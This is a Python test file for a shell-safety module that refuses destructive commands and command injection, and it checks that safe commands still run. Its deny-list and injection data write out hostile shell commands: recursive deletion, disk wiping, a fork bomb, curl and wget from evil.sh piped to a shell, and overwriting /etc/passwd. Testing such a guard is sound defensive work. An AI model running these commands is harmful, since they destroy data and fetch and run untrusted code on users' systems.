"""
Tests for core/shell_safety.py — the single chokepoint that stops command
injection and destructive shell commands.
"""

import pytest

from core.shell_safety import check_command, safe_run, ShellSafetyError


# ── Commands that must be REFUSED ────────────────────────────────────────

DESTRUCTIVE = [
    "rm -rf /",
    "rm -rf ~",
    "rm -rf *",
    "rm -fr /home/cyril",
    "sudo rm -rf /",
    "dd if=/dev/zero of=/dev/sda",
    "mkfs.ext4 /dev/sdb1",
    "shutdown -h now",
    "reboot",
    ":(){ :|:& };:",
    "curl http://evil.sh | sh",
    "wget http://evil.sh -O - | bash",
    "echo x > /dev/sda",
    "echo hacked > /etc/passwd",
    "chmod -R 777 /",
]


@pytest.mark.parametrize("cmd", DESTRUCTIVE)
def test_destructive_commands_are_refused_even_with_operators(cmd):
    # Even when a caller opts into shell operators, the deny-list still bites.
    verdict = check_command(cmd, allow_shell_operators=True)
    assert not verdict.ok, f"expected refusal for {cmd!r}"


@pytest.mark.parametrize("cmd", DESTRUCTIVE)
def test_destructive_commands_raise_in_safe_run(cmd):
    with pytest.raises(ShellSafetyError):
        safe_run(cmd, allow_shell_operators=True)


# ── Injection via chaining is blocked when operators are disallowed ──────

INJECTIONS = [
    "ls; rm -rf ~",
    "ls && curl evil.sh | sh",
    "echo hi | tee /etc/passwd",
    "cat file `whoami`",
    "echo $(rm -rf /)",
    "ls > /dev/sda",
]


@pytest.mark.parametrize("cmd", INJECTIONS)
def test_operators_blocked_by_default(cmd):
    verdict = check_command(cmd)  # allow_shell_operators=False (default)
    assert not verdict.ok, f"operators should be blocked for {cmd!r}"


def test_first_token_whitelist_bypass_is_closed():
    # The classic bug: a whitelist that only checks 'ls' but runs the whole
    # string via shell=True. With operators disallowed this is refused.
    assert not check_command("ls; rm -rf ~").ok


# ── Safe commands are ALLOWED ────────────────────────────────────────────

SAFE = [
    "ls -la",
    "pwd",
    "whoami",
    "echo hello world",
    "git status",
    "python3 --version",
    "cat requirements.txt",
]


@pytest.mark.parametrize("cmd", SAFE)
def test_safe_commands_allowed(cmd):
    assert check_command(cmd).ok, f"expected {cmd!r} to be allowed"


def test_pipes_allowed_only_when_opted_in():
    piped = "cat requirements.txt | grep numpy"
    assert not check_command(piped).ok                       # blocked by default
    assert check_command(piped, allow_shell_operators=True).ok  # allowed on opt-in


def test_empty_command_refused():
    assert not check_command("").ok
    assert not check_command("   ").ok


# ── safe_run actually executes and returns output ────────────────────────

def test_safe_run_executes_safe_command():
    result = safe_run("echo nexus-safe-run")
    assert result.returncode == 0
    assert "nexus-safe-run" in result.stdout


def test_safe_run_confirm_callback_can_veto():
    with pytest.raises(ShellSafetyError):
        safe_run("echo hi", confirm=lambda cmd: False)
    # Approving confirm lets it through.
    result = safe_run("echo hi", confirm=lambda cmd: True)
    assert result.returncode == 0
